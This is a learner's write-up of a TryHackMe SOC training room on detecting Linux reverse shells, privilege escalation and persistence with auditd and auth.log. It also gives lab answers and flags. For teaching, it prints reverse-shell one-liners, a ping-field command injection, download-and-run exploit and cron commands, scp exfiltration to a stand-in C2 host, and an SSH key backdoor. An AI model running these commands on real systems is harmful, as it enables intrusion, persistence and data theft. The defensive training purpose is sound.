---
title: Linux Threat Detection 3
module: Linux Security Monitoring
path: SOC Level 1
platform: TryHackMe
tags: [linux, threat-detection, auditd, reverse-shells, privilege-escalation, persistence]
status: Completed
date: 2026-07-03
date_completed: 2026-07-03
---

*Write-up by [Miyu7x](https://github.com/Miyu7x) | TryHackMe: [Miyu7](https://tryhackme.com/p/Miyu7) | BTLO: [Miyu7x](https://blueteamlabs.online/public/user/Miyu7x)*
<p align="center">
<img src=screenshots/linux3_intro.png width="1500">
</p>

## Task 1: Introduction

Not all Linux attacks are simple SSH brute force or cryptomining. This room covers more complex, manual Linux attack techniques seen in targeted intrusions and how to detect them through system logs.

**Learning Objectives**

- Learn how reverse shells are used in Linux intrusions
- Understand how attackers escalate their privileges
- Explore the five most common techniques to persist on Linux
- Uncover the learned techniques through system logs

**Let's go!**

**Answer:** N/A

## Task 2: Reverse Shells

### Attack Convenience

Attackers when they breach a system thur SSH they get a visual terminal, which often has autocompletion and Ctrl+C integration.  
	- Initial Access via exploit or web vulnerability often comes with visual difficulties for the attackers.
	- Buggy command output, execution delays and timeouts, rate limits, network restrictions and many more.

**Example of Attack Limitations**
<p align="center">
<img src=screenshots/linux3_attacklimitations.png width="700">
</p>

### Reverse Shells

To reduce friction and make the workflow easier attackers will attempt to deploy a reverse shell right away.

Three methods to open a reverse shell on Linux:

| Command on the Victim | Explanation |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | The victim is forced to connect to 10.10.10.10:1337 and launch bash for the attacker. |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525. |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Python alternative to the above command. The attacker is listening at 10.30.30.30:80. |



### Detecting Reverse Shells

Reverse shells should be treated as a **high alert** for any SOC. 
	- Reverse shell means a human has gained access and is actively trying to establish a shell connection to further their attack
	- Reverse shell is detectable with **auditd**

**Example: Reverse Shell Established via TryPingMe Web Vulnerability**

```
root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

The reverse shell will connect back to the attackers IP, this is usually followed by **Discovery** commands

**Example: Detecting the Reverse Shell**
```

root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
[...]

```
---

In this task, use the VM to see how TryPingMe vulnerability works in practice:
    - Access TryPingMe through your browser or AttackBox at http://MACHINE_IP:8000
    - Access the scenario auditd logs at ausearch -i -if /home/ubuntu/scenario/audit.log
	
---


**1. Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?**

<p align="center">
<img src=screenshots/linux3_trypingme.png width="700">
</p>
Whenever an attacker sees an input box their first thought proably is: is this input box sanitized, followed by inputting a command in there stringed with the format of what the input box might be looking for. In this case its looking for a domain or an IP address so the attacker does just that. The fact that this website in particular returns the result on the web browser itself lets the attacker know right away that this website is vulnerable.
Command: 127.0.0.1 && whoami 

**Answer: svctrypingme**

---

**2. Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?**

<p align="center">
<img src=screenshots/linux3_revshell.png width="700">
</p>
The attacker saw the vulnerability and now they want to run a command so that this web server calls back to their computer... Its not really practical to use the browser and the little input box to run multiple commands. The field TCP: in a real-world attack would be followed by the attacker's real IP address, and thats where the victim system will connect to. 

**Answer: THM{revshells_practitioner!}**

---

**3. Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?**

<p align="center">
<img src=screenshots/linux3_socatcommand.png width="700">
</p>
As an SOC we can set rules in auditd to search for commands that spawn reverse shell in order to maintain visibility where it matters. 

**Answer: 10.14.105.255**

---

## Task 3: Privilege Escalation

### Privilege Escalation Basics

Attackers, once they get past Initial Access they face various difficulties. We saw how a lack of an SSH connection would force them to use discovery commands on the browser window, which doesn't offer the full capabilities of bash.
	- More often than not if an attacker breaches a system they find themselves with the lowest privileges
		- These low privilege accounts dont offer much visibility usually they are low in the hierarchy; if were talking a large-scale network
		- **Privilege Escalation** MITRE technique **TA0004** definition: Consists of techniques that adversaries use to gain higher-level permissions on a system or network.

**Example: Attacker Performs Discovery to Get to Root**

| Preceding Discovery (IF) | Privilege Escalation (THEN) |
|---|---|
| The `uname -a` shows an old, unpatched Ubuntu 16.04 | Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash` |
| The `find /bin -perm 4000` detects an env binary with the SUID flag | Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p` |
| The `ls /etc/ssh` exposed an unprotected ssh-backup-key file | Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key` |



### Detecting Privilege Escalation

Detecting privilege escalation is tricky for SOCs. There are hundreds of Linux misconfigurations and thousands of software vulnerabilities that can be exploited, so hunting for the exploit itself is like finding a needle in a haystack.
Instead of chasing every possible technique, SOCs look for more common attack indicators: 
	- A sudden UID/GID change 
	- A low-privilege account spawning a root shell
	- A process tree that doesn't make sense.

Reference syntax for confirming privilege escalation by comparing effective user before and after:

```
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data

```
Even if you don't know how the **PwnKit** exploit works, you can still find anomalies using some common attack indicators.
	- Spot suspicious activity
	- Confirm whether privilege escalation succeeded by comparing the user before and after the exploit
	- If the user has changed, the attacker succeeded in **privilege escalation**

**Example: Looking for Reverse Shell Activity & PwnKit Privilege Escalation**

```
root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec

root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```
---

Continue with the TryPingMe scenario and find out what followed the reverse shell!
You can start the hunt from ausearch -i -if /home/ubuntu/scenario/audit.log.

---

**1. Which command line was used to look for the "pass" keyword in files?**

<p align="center">
<img src=screenshots/linux3_passcommand.png width="700">
</p>
An attacker will run discovery commands on the victim to obtain information or data, such as user login credentials and stored passwords, to perform privilege escalation. This is why looking for specific commands that include the keyword "pass" can be useful; in a real investigation, you would broaden the search to include pass, pwd, password... Type proctitle and keyword pass will return all commands that include the keyword pass.
Command: **ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=PROCTITLE" | grep "pass"**

**Answer: grep -iR pass .**

---

**2. Which command line was used to escalate privileges to root?**

<p align="center">
<img src=screenshots/linux3_suroot.png width="700">
</p>
Attackers may sometimes land themselves in a system that privilages are not protected and by running sudo su, or sudo root they can find themselves in full control. We can filter specifically for commands containing the word "root"
Command: ausearch -i -if /home/ubuntu/scenario/audit.log | grep "type=PROCTITLE" | grep "root"

**Answer: su root**

---

**3. Looking at the detected .env file, what was the root password?**

<p align="center">
<img src=screenshots/linux3_grepenv.png width="700">
</p>
I was finding myself tripped up to follow processes, and just coming from Windows Logs, it is good to note that Event ID in Linux is a serial code, a one-time event. In Windows, they're reused to identify a specific process, always the same numbers. Ran the command to find any .env file
Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep ".env"**
type=PROCTITLE msg=audit(09/23/25 14:53:44.238:2137) : proctitle=cat .env.local

We found the command but in order to read it we need the exact path, since we used grep we lose some of the information on the log block. If we add the flags -A 3 to the command will return the first line of the block; Auditd blocks here are 4 lines (PROCTITLE, CWD, EXECVE, SYSCALL), your match is line 1, so you need 3 more lines after it, hence -A 3
Command: **sudo ausearch -i -if /home/ubuntu/scenario/audit.log | grep -A 3 ".env"**
<p align="center">
<img src=screenshots/linux3_grepa.png width="700">
</p>

<p align="center">
<img src=screenshots/linux3_password.png width="700">
</p>

**Answer: nGql1pQkGa**

---

## Task 4: Startup Persistence

### Persistence in Linux

Standalone servers can run for years without a single reboot... Attackers expect this, so their best offense is a slow one.
	- How do attackers achieve backdoor persistence?
	- What are the most common ones?


### Cron Persistence

Windows has scheduled tasks; **Cron jobs** behave much the same way. **Scheduled Tasks** and **Cron Jobs** are the most popular persistence method.
	- How do you ensure these tasks survive a reboot?
	- Attackers will simply add a line to the victims cron job file located at /var/spool/cron/user 
		- This will ensure the malware runs on every boot

```
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &```

```
Another **Example:**]
	- Rocke cryptominer:
		- Installs a script at **/etc/cron.d/root** 
		- The script runs ***/10** on its code which means the script will redownload every **10** minutes
		- Even if IT deletes it, it can quickly redownload

**Rocke Cryptominer 10 Second Re-Download Script**
```
# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root

```

### Systemd Persistence

**Systemd** is in charge of the most critical components of your machine. 

```
# Simplified contents of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguised as a trusted file

```



### Detecting Persistence

**Cron Jobs** and **Systemd** can be monitired by having rules set in auditd. 
	- **crontab** to search for managing cron jobs
	- **systemctl** for managing services


| Monitor changes in cron job files | /etc/crontab, /etc/cron.d*, /var/spool/cron/*, /var/spool/crontab/* |
|---|---|
| Monitor changes in systemd folders | /lib/systemd/system/*, /etc/systemd/system/*, and less common locations |
| Monitor related processes such as | nano /etc/crontab, crontab -e, systemctl start\|enable <service> |

Reference syntax:

```
root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```
---

In this task, try to detect two persistence methods by using auditd logs (ausearch -i).
Once detected, launch the persisted malware (e.g. /bin/malware) and get your flag!
Note: You might need to switch to root for this task by running sudo su

---

**1. What flag did you get after running the malware persisting as a service?**

<p align="center">
<img src=screenshots/linux3_persistence.png width="700">
</p> 
Searching for malicious services we started with: **ausearch -i -f /etc/systemd**. 
type=PROCTITLE msg=audit(09/23/25 17:06:42.860:834) : proctitle=nano /etc/systemd/system/tux.service
Now that we have the full path, we ran: **sudo systemctl start tux.service**
	- This runs the malware service...
	- We pull out our powerful log tool **journalctl** to see the actions ran by tux.service
		- journalctl -u tux.service

```
root@thm-vm:/home/ubuntu$ sudo systemctl start tux.service
root@thm-vm:/home/ubuntu$ journalctl -u tux.service
WARNING: terminal is not fully functional
Press RETURN to continue 
Jul 07 00:59:17 thm-vm systemd[1]: Started tux.service - Tux Helper Library.
Jul 07 00:59:17 thm-vm tux[1822]: =========================================
Jul 07 00:59:17 thm-vm tux[1822]: Good job finding me! Where did I persist
Jul 07 00:59:17 thm-vm tux[1822]: Example: /folder/name.service
Jul 07 00:59:17 thm-vm tux[1822]: =========================================
Jul 07 00:59:17 thm-vm tux[1822]: Your answer: Incorrect, try again!
Jul 07 00:59:17 thm-vm tux[1822]: =========================================
Jul 07 00:59:17 thm-vm tux[1822]: Press Enter to exit...
Jul 07 00:59:17 thm-vm systemd[1]: tux.service: Deactivated successfully.
root@thm-vm:/home/ubuntu$ 
```
We tried funning the service file directly from the path we found but, the message is there, incorrect answer, where do I persist file/path try again... We read the tux.service file with:

```
root@thm-vm:/home/ubuntu$ cat /etc/systemd/system/tux.service                                                                
[Unit]
Description=Tux Helper Library
Wants=network-online.target
After=network-online.target

[Service]
ExecStart=/var/lib/misc/tux

[Install]
WantedBy=multi-user.target
```

This leads us to run the file with the path: /var/lib/misc/tux
<p align="center">
<img src=screenshots/linux3_penguin.png width="700">
</p> 

**Answer: THM{hidden_penguin!}**

---

**2. What flag did you get after running the malware persisting as a cron job?**

If an SOC suspects there has been a cronjob added but they dont know to which user, they can run: 
**ls -la /var/spool/cron/crontabs/**

```
oot@thm-vm:/home/ubuntu$ ls -la /var/spool/cron/crontabs/
total 12
drwx-wx--T 2 root crontab 4096 Sep 23  2025 .
drwxr-xr-x 3 root root    4096 Oct 22  2024 ..
-rw------- 1 root crontab 1015 Sep 23  2025 root
```

This will tell us the lastest cronjob set by what user, with that information we can filter by edited crontab jobs for root. 
Command: **sudo crontab -l -u root**
<p align="center">
<img src=screenshots/linux3_phoenix.png width="700">
</p> 

```
root@thm-vm:/home/ubuntu$ sudo /usr/sbin/phoenix
=========================================
Good job finding me! Where did I persist
Example: /folder/cronfile
=========================================
Your answer: /var/spool/cron/crontabs/root   
THM{ressurect_on_reboot!}
=========================================
Press Enter to exit...
```


**Answer: THM{ressurect_on_reboot!}**

---

## Task 5: Account Persistence

### Account Persistence

How do attackers leave a backdoor persistence for later access? You dont want to leave evidence of malware...


### New User Account

If an attacker got in by SSH, they may create a brand new user and add it to a privileged group for later access..
	- Detecting this type of persistence is easier if you know what creation events to track!
		- Authentication logs will offer valuable information to reconstruct the attack tree
			- auditd search: **ausearch -i --ppid 27254 **

**Example: Detecting New User Account:**

```
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

### Backdoored SSH Keys

Sometimes the attacker is not able to create a new user account, but they have found stored SSH keys...
The attacker will backdoor the SSH and use them for future logins... This is tricky for SOCs to spot as this process can easily blend in within a legitimate login,

**Example: Adding SSH Backdoor to Authorized Keys**:

```
# Adding SSH backdoor to the authorized_keys
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys

# It's hard to guess which key is a backdoor!
root@thm-vm:~$ cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
```
SSh keys by default are stored in **~/.ssh/authorized_keys**, as an SOC its vital to keep rules monitoring changes in these files.
	- In this case, process creation events are ineffective; SSH keys can be modified in a multitude of different ways.
	- Thus why logging evidence of SSH key manipulation is a bit more difficult

**Example: Detecting SSH Behavior**
```
# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"
# Note how the malicious "echo" command is logged simply as "bash"
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```
	


### Application Persistence

If an attacker breaches a WordPress website and they have access to amdin privileges they can:
	- add a backdoor to the website and run commands thru the backldoor
	- No cron job or SSH keys required
	- The persistence lives in the application layer
		- **auditd** and **system logs** often **never** see it

If you suffered a breach and cleared all possible techinique persistence but malware keeps reappearing; your **public-facing** app may be compromised
**Example**
<p align="center">
<img src=screenshots/linux3_apppersistence.png width="700">
</p> 
---

Now, detect two more persistence methods on the VM: Backdoored user and SSH key.
You can use auditd (ausearch -i) and authentication logs to answer the questions.
**/var/log/auth.log**

---

**1. Which user was created and added to the sudo group?**

<p align="center">
<img src=screenshots/linux3_apppersistence.png width="700">
</p> 
In order to filer for added users, were going to read the auth.log file for any "useradd".
Command: cat /var/log/auth.log | grep "useradd" 

**Answer: koichi**

**Which file was changed to allow SSH key persistence?**

**Answer: /root/.ssh/authorized_keys**

## Task 6: Targeted Attacks and Recap

### Targeted Attacks

Targeted attacks are more devastating because the attacker knows where they are going and who they want to hurt. It could be a specific high-profile person, a large company, or a government entity.
	- The reward and risk are much greater, as is the difficulty.


### Linux as Entry Point

Linux machines are mostly used as firewalls, web servers, mail servers or other public-facing services.
	- Your entire company might run on Windows, but your mail server may be LInux...
		- That compromised mail server can be an entry point to the entire company network.
<p align="center">
<img src=screenshots/linux3_webserver.png width="700">
</p> 

### Linux in Espionage

The government is known for using Linux machines to store sensitive information. This makes these Linux machines appealing to state threat actors.
**Example: Backdoor via Systemd Service Persistence**
<p align="center">
<img src=screenshots/linux3_systemd.png width="700">
</p> 

### Linux in Ransomware

Hypervisors are becoming quite popular in Ransomware attacks... Imagine hundreds of Windows VMs that all sit inside just 3 Linux physical servers(hypervisors).
	- If the hypervisors are not secured a breach could spill into the entire company, hundreds of Windows VMs will be compromised
**Example: Windows VMs Hosted by Linux Hypervisor**
<p align="center">
<img src=screenshots/linux3_hypervisor.png width="700">
</p> 

### Threat Detection Recap

**auth.log** /var/log/auth.log
	- Who logged in, when, and from where using which method?
	- grep or cat directly, human-readable from the box 
	- logins, logouts, sudo usage, su usage, SSH connection accepted/rejected, password changes
	- PID only sshd[1234] 

**audit.log** /var/log/audit/audit.log
	- Tracks file create/writes/reads, process execution, and permissions changes
	- Kernel audit rules need to be created to determine what the SOC needs to monitor
	- **ausearch -i** needed to read it, it is numeric formated
	- audit(timestamp:serial), -a (serial) for investigation

**MITRE ATT&CK Matrix of Threat Detection Recap**

 <p align="center">
<img src=screenshots/linux3_mitre.png width="700">
</p> 

---

**1. Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)**

**Answer: Yea**

---

**2. Should you learn Linux threats even if working with Windows? (Yea/Nay)**

**Answer: Yea**

## Task 7: Conclusion

**Complete the room!**

**Answer:** N/A
